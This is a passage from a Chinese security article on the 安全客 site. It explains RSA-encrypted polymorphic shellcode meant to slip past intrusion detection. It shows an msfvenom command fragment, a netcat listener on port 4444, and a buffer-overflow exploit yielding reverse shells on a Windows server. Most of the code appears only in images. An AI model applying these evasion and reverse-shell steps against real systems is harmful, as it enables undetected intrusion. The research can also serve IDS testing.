x86/shikata_ga_nai&nbsp;-b&nbsp;‘\x00’&nbsp;-f&nbsp;python</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在这一点上要强调的要点是选项-b \ x00，其告诉msfvenom的引擎避免这个操作码，因为如果接收到这个操作码，shellcode会突然结束而不继续运行其余的指令。此命令输出特定于此攻击者的shellcode，如下所示：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01c35e0b6965712d84.png" title="t0142bc8cf881d863b8.png" alt="http://p5.qhimg.com/t0142bc8cf881d863b8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个shellcode将被直接复制到exploit中，如下所示：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01115909a059a8675b.png" title="t01a738114529d08bf4.png" alt="http://p7.qhimg.com/t01a738114529d08bf4.png"/></p><p style="text-align:center"><img src="http://p4.qhimg.com/t019b14dbdc5a6f285f.png" title="t016fde1774a0167866.png" alt="http://p3.qhimg.com/t016fde1774a0167866.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完成此项后，在运行之前，我们将需要一个服务器监听端口4444。为了接收连接，使用netcat（nc - nvlp 4444）。我们运行利用代码，应该会在netcat的会话中得到一个shell。这是我们运行利用代码之前的会话：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01d95639410b041e11.png" title="t016ebdd3799d013f00.png" alt="http://p8.qhimg.com/t016ebdd3799d013f00.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以观察到，netcat正在监听端口4444，并且利用代码尚未执行，现在，当我们运行利用代码，会发生以下情况：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01b3591ef6c5cfd72e.png" title="t0125f748d40b9578ba.png" alt="http://p4.qhimg.com/t0125f748d40b9578ba.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们可以看到，利用代码在处于监听状态的会话中没有产生任何错误。我们在具有有漏洞的服务器用户所有者的执行权限的Windows系统上有一个直接shell。可以看到，在Windows会话中硬盘驱动器是C，这表明入侵已成功。服务器状态保持稳定，即尽管有BoF，仍继续正确操作，指示ASM级别没有检测到问题，执行shellcode并将其发送到指定端口指定的IP地址：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t0109626877aa19aa01.png" title="t010d644c375e1b4af9.png" alt="http://p8.qhimg.com/t010d644c375e1b4af9.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这表明远程Windows利用代码是完全成功的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在我们有了在利用代码中测试RSA非对称算法加密的所有元素。此时，现在唯一要做的是使用具有数字3和171的加密程序，并将其放入利用代码中。现在我们将加密原始的shellcode：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0160d539a39ca17073.png" title="t017d7b150b0627b05b.png" alt="http://p1.qhimg.com/t017d7b150b0627b05b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完成此项后，我们将具有加密的shellcode的最终字符串复制到最终利用代码中：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t0132f298ef672b8701.png" title="t01e5b16f83abcdc515.png" alt="http://p7.qhimg.com/t01e5b16f83abcdc515.png"/></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0136ac056f426bd32d.png" title="t018e6308f3b7c55e89.png" alt="http://p2.qhimg.com/t018e6308f3b7c55e89.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">expl.send(buffer)
expl.close()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以观察到，操作码不表示入侵检测系统（IDS / IPS）的任何东西，是不相干的操作码，因为其被加密了。以下是执行之前和之后：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t018afe591948bc69bf.png" title="t012fb27d72df6c980f.png" alt="http://p4.qhimg.com/t012fb27d72df6c980f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">表示加密或解密的操作码，加密的操作码被分离。将根据在解密的程序中指定的跳跃来保存地址，以获得堆栈的增长和EIP的存储器中的位置：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01f28116c5b82c7392.png" title="t01e4cf05c7de02758c.png" alt="http://p3.qhimg.com/t01e4cf05c7de02758c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解释上面的内容后，我们将展示执行具有非对称多态Shellcode的利用代码前的会话：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01db55ba73fbe5eb06.png" title="t01a3f4783c4ef05101.png" alt="http://p8.qhimg.com/t01a3f4783c4ef05101.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">服务器正在运行和调试：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01a356e9905d451f5c.png" title="t01c2d41b76c7e484dd.png" alt="http://p3.qhimg.com/t01c2d41b76c7e484dd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在让我们执行远程利用代码。预期的结果正是，在堆栈中运行时解码每个操作码之后，获得反向shell：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01d32017830709efc5.png" title="t0171912cad4feb0100.png" alt="http://p4.qhimg.com/t0171912cad4feb0100.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">执行成功，我们可以看到，代表利用代码的脚本的顶部已经被执行，在Netcat会话中，成功地从被攻破的机器接收到远程shell。我们可以在Linux会话上看到硬盘驱动器上的标签，除了一个简单和正常的连接之外，服务器没有注意到任何异常：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01858b64769a701395.png" title="t01d432a7abcecd6b2f.png" alt="http://p2.qhimg.com/t01d432a7abcecd6b2f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由此证明了算法作为应用程序的功能，其能够使用RSA加密来对操作码进行加密，这产生多态非对称shellcode——可在本地和远程利用代码中使用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">结论</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">本文介绍了用于加密shellcode的RSA算法、其在实际利用代码中的使用、代表前述算法的操作码的优化及用于加密的程序，我们得出的结论是，基于获得的和证明的结果，其提供了该建议的有效性的优异结果。基于RSA算法的多态性根本不影响注入到利用代码的恶意有效载荷的最终执行，IDS根本无法检测到它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">要强调的一个重要方面是，本研究的重点完全是攻击性的，但内在的、附带的结果是防御。加密算法还可以用于测试IDS或IPS，因此提供了一种以理想情况下入侵者所采用的方式执行测试的工具（修改利用代码和完成shellcoding）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们得出的另外一个结论是，这不仅开发了一种用于零日攻击和逃避NIDS的算法和工具，还提供了一种可以考虑的防御方法及相应的测试环境。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3615.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】智能逃避IDS——RSA非对称多态SHELLCODE - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3615" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
